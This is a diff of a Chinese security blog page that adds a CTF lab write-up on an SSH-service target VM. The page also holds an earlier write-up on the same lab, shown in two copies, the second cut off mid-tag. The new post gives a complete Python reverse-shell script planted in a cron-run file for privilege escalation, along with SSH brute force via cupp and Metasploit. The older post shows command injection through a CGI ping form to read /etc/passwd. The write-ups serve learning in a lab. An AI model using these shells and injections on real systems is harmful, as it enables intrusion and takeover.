@@ -160,6 +160,83 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-GetFlag-SSH服务" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/24/GetFlag-SSH%E6%9C%8D%E5%8A%A1/">GetFlag-SSH服务</a>
+    </h1>
+  
+
+        
+        <a href="/2020/05/24/GetFlag-SSH%E6%9C%8D%E5%8A%A1/" class="archive-article-date">
+  	<time datetime="2020-05-23T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列SSH服务篇，本篇主要内容为通过cupp工具结合msf暴力破解用户密码提权到root权限。涉及知识点：cupp字典生成工具、msf暴力破解、ssh服务以及linux基础命令等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.107<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.102<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、cupp、msfconsole、VMware<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.3.102</code><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;&emsp;&emsp;开放端口： 22(ssh)、80(http)、111(PRC)<br>&emsp;&emsp;&emsp;&emsp;Web容器信息：Apache httpd 2.4.10<br>&emsp;&emsp;&emsp;&emsp;系统主机信息：Debian 5<br>&emsp;&emsp;针对开放http服务的80端口，进一步探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.102</code><br>&emsp;&emsp;输入<code>dirb http://192.168.3.102</code><br>&emsp;&emsp;扫描结果<br>&emsp;&emsp;/files/、/icons/、robots.txt、/wordpress-blog/、/manual/<br>&emsp;&emsp;<strong>深入挖掘</strong><br>&emsp;&emsp;打开浏览器访问靶场ip<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;可能是靶机用户名，查看页面源代码，无敏感信息<br>&emsp;&emsp;访问/files/，目录为空<br>&emsp;&emsp;访问/manual/，是apache首页<br>&emsp;&emsp;访问/wordpress-blog/，一张图片，页面源代码无信息<br>&emsp;&emsp;访问robots，无新信息<br>&emsp;&emsp;访问/icons/<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;发现一个不太正常的文件名，查看内容<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;ssh私钥信息<br>&emsp;&emsp;下载并重命名<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;进入到破解工具john的目录下<code>/usr/share/john</code>，将id_rsa文件放到此目录下<br>&emsp;&emsp;输入命令<code>python ssh2john.py id_rsa &gt;rsacrack</code>将id_rsa转换为john可识别的信息并保存为rsacrack文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;提示没有密码<br>&emsp;&emsp;直接尝试远程登录，登录之前需要赋予id_rsa可执行权限，先尝试martin用户<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;成功登录，无法知道密码，无法直接提权，这里可以利用cupp字典生成工具结合metasploit的暴力破解模块，对其密码进行暴力破解<br>&emsp;&emsp;进入到cupp目录<br>&emsp;&emsp;打开终端，输入<code>python3 cupp.py -i</code>以交互式问答的方式创建字典<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;创建好一个简单的字典后<br>&emsp;&emsp;打开msfconsole<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;执行之后，破解密码失败<br>&emsp;&emsp;———-分割线———<br>&emsp;&emsp;查看passwd文件查看其它用户<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;确认还存在jimmy、hadi用户<br>&emsp;&emsp;尝试定时任务提权，查看是否有非root权限的用户存在定时任务<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;看到jimmy用户存在一个定时任务，编辑sekurity.py的代码为python反弹shell代码，当其文件被执行时，就可以成功反弹终端<br>&emsp;&emsp;代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!&#x2F;usr&#x2F;bin&#x2F;python<br>import os,subprocess,socket<br><br>s&#x3D;socket.socket()<br>s.connect((&quot;攻击机ip&quot;,攻击机端口))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;])<br></code></pre></td></tr></table></figure>
+<p>&emsp;&emsp;创建文件、设置可执行权限，编辑文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;这是使用nano工具编辑文件，ctrl+o保存，回车确定，ctrl+x退出，成功编辑好之后<br>&emsp;&emsp;打开nc监听，定时任务为5分钟执行一次<br>&emsp;&emsp;发现ip设置错误，修改之后，继续等待<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;成功反弹终端后，同样不知道用户密码，同上，使用cupp生成字典，结合msf暴力破解密码，破解失败。<br>&emsp;&emsp;尝试最后一个用户hadi，操作同上<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;成功破解出hadi的密码为hadi123，打开会话<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8715.png" alt=""><br>&emsp;&emsp;利用python脚本反弹终端，输入密码提权<br>&emsp;&emsp;成功提权后，寻找Flag<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;成功获得Flag<br>&emsp;&emsp;<br><strong>0x04总结</strong><br>&emsp;&emsp;此次渗透，主要是通过ssh服务认识了cupp工具和熟悉了msf-ssh暴力破解ssh登录模块，同时还认识了通过定时任务反弹终端的新姿势。<br>&emsp;&emsp;难度尚可，继续学习。</p>
+<p><br><br><br><br><font face="Georgia" color=#c4444>不断学习，不断积累。</font><br>作者：WebDogC</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">复现、CTF、study、flag、ssh</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/05/24/GetFlag-SSH%E6%9C%8D%E5%8A%A1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-GetFlag-SSH密钥泄露" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -242,7 +319,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/13/GetFlag-%E5%89%8D%E7%BD%AE%E7%AF%87/">GetFlag-前置篇</a>
+      <a class="article-title" href="/2020/05/13/GetFlag-%E5%89%8D%E7%BD%AE%E7%AF%87/">GetFlag-靶场夺旗</a>
     </h1>
   
 
@@ -255,7 +332,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列前置篇，本篇主要内容为渗透流程以及渗透思路。涉及知识点：工具nmap、dirb、nikto、nc的使用以及linux基础命令等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.107<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.105<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、netcat、VMware<br><strong>0x03过程</strong><br><strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.3.105</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;开放端口：<br>&emsp;&emsp;21(ftp)、22(ssh?)、80(http)、9090(http)13337、22222(ssh)、60000<br>&emsp;&emsp;Web容器信息：Apache httpd 2.4.27<br>&emsp;&emsp;系统主机信息：Ubuntu 14.04.05<br>&emsp;&emsp;针对开放非http服务的大端口号，可以使用netcat，输入命令<code>nc ip port</code>进一步探测敏感信息<br>&emsp;&emsp;首先针对端口13337<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;出现Flag<br>&emsp;&emsp;端口22222<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;确认ssh服务<br>&emsp;&emsp;端口60000<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;反弹一个shell，首先pwd查看当前位置，ls查看当前目录，cat查看文件内容，获得Flag<br>&emsp;&emsp;—————–分割线———————<br>&emsp;&emsp;针对开放的ftp服务，进一步探测敏感信息<br>&emsp;&emsp;打开浏览器访问<code>ftp://192.168.3.105/</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;获得Flag<br>&emsp;&emsp;针对开放http服务的80以及9090端口，进一步探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.105</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.3.105</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;扫描结果：<br>&emsp;&emsp;index.html、/passwords/、robots.txt、/cgi-bin/<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.105:9090</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.3.105:9090</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;扫描无结果<br><strong>深入挖掘</strong><br>&emsp;&emsp;先来看看9090端口<br>&emsp;&emsp;打开浏览器访问192.168.3.105:9090<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;页面回显Flag，查看页面源代码，没有可利用的注释信息，且没有发现其他可深入的地方。<br>&emsp;&emsp;再来看看80端口<br>&emsp;&emsp;打开浏览器访问192.168.3.105<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;一个图片展示页，并带有提示信息。<br>&emsp;&emsp;查看页面源代码，无可利用信息<br>&emsp;&emsp;再来看看目录/passwords/<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;获得FLag<br>&emsp;&emsp;访问passwords.html，页面是提示信息<br>&emsp;&emsp;查看页面源代码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8715.png" alt=""><br>&emsp;&emsp;获得信息：密码winter，也许之后可利用<br>&emsp;&emsp;访问/cgi-bin/<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;没有权限<br>&emsp;&emsp;最后来看看robots.txt<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8717.png" alt=""><br>&emsp;&emsp;逐个访问<br>&emsp;&emsp;访问/cgi-bin/root_shell.cgi<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8718.png" alt=""><br>&emsp;&emsp;页面源代码注释信息也许之后有用<br>&emsp;&emsp;访问/cgi-bin/tracertool.cgi<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8719.png" alt=""><br>&emsp;&emsp;ping命令执行窗口，也许存在命令注入漏洞<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8720.png" alt=""><br>&emsp;&emsp;页面有回显，且是用GET传递ip参数<br>&emsp;&emsp;尝试使用<code>;</code>进行注入<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8721.png" alt=""><br>&emsp;&emsp;注入成功，查看敏感信息/etc/passwd<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8722.png" alt=""><br>&emsp;&emsp;使用more替换cat命令<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8723.png" alt=""><br>&emsp;&emsp;成功查看文件内容，信息泄露<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8724.png" alt=""><br>&emsp;&emsp;发现Summer(夏季)用户，之前挖掘到了密码winter(冬季)，猜测，winter是Summer用户的密码<br>&emsp;&emsp;漏洞利用<br>&emsp;&emsp;靶机开放ssh服务，可以使用ssh服务进行远程连接<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8725.png" alt=""><br>&emsp;&emsp;成功登录返回终端<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8726.png" alt=""><br>&emsp;&emsp;成功获得Flag<br>&emsp;&emsp;尝试简单提权<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8727.png" alt=""><br>&emsp;&emsp;发现Summer用户无法执行root权限的命令。<br>&emsp;&emsp;此次渗透到此为止。<br><strong>0x04总结</strong><br>&emsp;&emsp;靶机不同于之前做的针对于当个漏洞知识点的靶场，更能让人体会到以信息收集过程开始的渗透流程。靶机难度不高，基本上是考验细心程度以及对搜集到的信息的敏感程度，Flag的位置比较容易发现，适合新手。<br>&emsp;&emsp;此次玩耍虽没用上什么厉害的姿势与方法，但就着这篇文章横向进行学习，不懂的名词或者命令等百度检索之后，还是能够学到一些知识点，点点滴滴下去，还是能有所收获的。</p>
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列之靶场夺旗，本篇主要内容为渗透流程以及渗透思路。涉及知识点：工具nmap、dirb、nikto、nc的使用以及linux基础命令等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.107<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.105<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、netcat、VMware<br><strong>0x03过程</strong><br><strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.3.105</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;开放端口：<br>&emsp;&emsp;21(ftp)、22(ssh?)、80(http)、9090(http)13337、22222(ssh)、60000<br>&emsp;&emsp;Web容器信息：Apache httpd 2.4.27<br>&emsp;&emsp;系统主机信息：Ubuntu 14.04.05<br>&emsp;&emsp;针对开放非http服务的大端口号，可以使用netcat，输入命令<code>nc ip port</code>进一步探测敏感信息<br>&emsp;&emsp;首先针对端口13337<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;出现Flag<br>&emsp;&emsp;端口22222<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;确认ssh服务<br>&emsp;&emsp;端口60000<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;反弹一个shell，首先pwd查看当前位置，ls查看当前目录，cat查看文件内容，获得Flag<br>&emsp;&emsp;—————–分割线———————<br>&emsp;&emsp;针对开放的ftp服务，进一步探测敏感信息<br>&emsp;&emsp;打开浏览器访问<code>ftp://192.168.3.105/</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;获得Flag<br>&emsp;&emsp;针对开放http服务的80以及9090端口，进一步探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.105</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.3.105</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;扫描结果：<br>&emsp;&emsp;index.html、/passwords/、robots.txt、/cgi-bin/<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.105:9090</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.3.105:9090</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;扫描无结果<br><strong>深入挖掘</strong><br>&emsp;&emsp;先来看看9090端口<br>&emsp;&emsp;打开浏览器访问192.168.3.105:9090<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;页面回显Flag，查看页面源代码，没有可利用的注释信息，且没有发现其他可深入的地方。<br>&emsp;&emsp;再来看看80端口<br>&emsp;&emsp;打开浏览器访问192.168.3.105<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;一个图片展示页，并带有提示信息。<br>&emsp;&emsp;查看页面源代码，无可利用信息<br>&emsp;&emsp;再来看看目录/passwords/<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;获得FLag<br>&emsp;&emsp;访问passwords.html，页面是提示信息<br>&emsp;&emsp;查看页面源代码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8715.png" alt=""><br>&emsp;&emsp;获得信息：密码winter，也许之后可利用<br>&emsp;&emsp;访问/cgi-bin/<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;没有权限<br>&emsp;&emsp;最后来看看robots.txt<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8717.png" alt=""><br>&emsp;&emsp;逐个访问<br>&emsp;&emsp;访问/cgi-bin/root_shell.cgi<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8718.png" alt=""><br>&emsp;&emsp;页面源代码注释信息也许之后有用<br>&emsp;&emsp;访问/cgi-bin/tracertool.cgi<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8719.png" alt=""><br>&emsp;&emsp;ping命令执行窗口，也许存在命令注入漏洞<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8720.png" alt=""><br>&emsp;&emsp;页面有回显，且是用GET传递ip参数<br>&emsp;&emsp;尝试使用<code>;</code>进行注入<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8721.png" alt=""><br>&emsp;&emsp;注入成功，查看敏感信息/etc/passwd<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8722.png" alt=""><br>&emsp;&emsp;使用more替换cat命令<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8723.png" alt=""><br>&emsp;&emsp;成功查看文件内容，信息泄露<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8724.png" alt=""><br>&emsp;&emsp;发现Summer(夏季)用户，之前挖掘到了密码winter(冬季)，猜测，winter是Summer用户的密码<br>&emsp;&emsp;漏洞利用<br>&emsp;&emsp;靶机开放ssh服务，可以使用ssh服务进行远程连接<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8725.png" alt=""><br>&emsp;&emsp;成功登录返回终端<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8726.png" alt=""><br>&emsp;&emsp;成功获得Flag<br>&emsp;&emsp;尝试简单提权<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8727.png" 